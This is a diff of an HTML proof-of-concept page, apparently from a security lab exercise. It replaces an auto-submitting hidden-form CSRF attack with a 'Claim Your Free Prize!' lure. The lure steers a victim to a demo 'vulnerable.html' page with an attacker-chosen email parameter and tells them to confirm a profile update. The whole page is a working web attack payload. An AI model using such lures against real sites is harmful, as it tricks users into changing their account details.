@@ -1,14 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>CSRF PoC - Change Name</title>
+    <meta charset="UTF-8">
+    <title>Attacker Page</title>
+    <style>
+        body { font-family: sans-serif; }
+        .container { text-align: center; padding: 40px; }
+        .link-button { font-size: 24px; padding: 15px 30px; background-color: #28a745; color: white; text-decoration: none; border-radius: 5px; }
+    </style>
 </head>
-<body onload="document.forms[0].submit()">
-  <h2>CSRF PoC: Change Display Name</h2>
-
-  <form action="http://localhost/vulnerable.html" method="GET">
-    <input type="hidden" name="name" value="HackedName123" />
-  </form>
+<body>
+    <div class="container">
+        <h1>Claim Your Free Prize!</h1>
+        <p>You have been selected to receive a prize. Click the link below to go to your account page and apply the prize by clicking the "Apply Profile Update" button.</p>
+        <br>
+        <a href="https://akhilagilgal.github.io/vulnerable.html?email=hacked-on-github@proof.com" class="link-button">
+            Step 1: Go to Your Account Page
+        </a>
+    </div>
 </body>
 </html>
